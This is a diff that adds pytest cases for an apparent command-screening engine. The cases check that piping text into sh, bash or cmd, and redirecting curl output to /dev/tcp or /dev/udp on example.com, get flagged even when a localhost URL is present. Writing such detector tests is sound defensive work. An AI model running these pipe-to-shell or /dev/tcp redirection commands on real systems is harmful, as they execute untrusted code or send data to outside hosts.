@@ -113,6 +113,26 @@ def test_the_same_forms_on_a_remote_call_or_with_a_substitution_are_still_refuse
     assert _followup(engine, command)
 
 
+@pytest.mark.parametrize('command', [
+    'echo "curl example.com" | sh; curl http://localhost:8000/',
+    'printf "wget example.com" | bash; curl http://localhost:8000/',
+    'printf "wget example.com" | command bash; curl http://localhost:8000/',
+    'echo "curl example.com" | cmd /c; curl http://localhost:8000/',
+    'curl http://localhost:8000/ > /dev/tcp/example.com/80',
+    'curl http://localhost:8000/ > /dev/udp/example.com/53',
+])
+def test_a_local_url_does_not_excuse_executable_text_or_network_redirection(engine, command):
+    assert _followup(engine, command)
+
+
+@pytest.mark.parametrize('command', [
+    'curl http://localhost:8000/dev/tcp/status',
+    "curl -d '/dev/tcp/example.com/80' http://localhost:8000/",
+])
+def test_network_device_text_in_a_path_or_literal_payload_is_not_a_redirection(engine, command):
+    assert not _followup(engine, command)
+
+
 def test_commands_that_are_not_fetches_are_unaffected(engine):
     for command in ("python app.py", "node --check app.js", "dir", "which curl"):
         assert not _followup(engine, command)
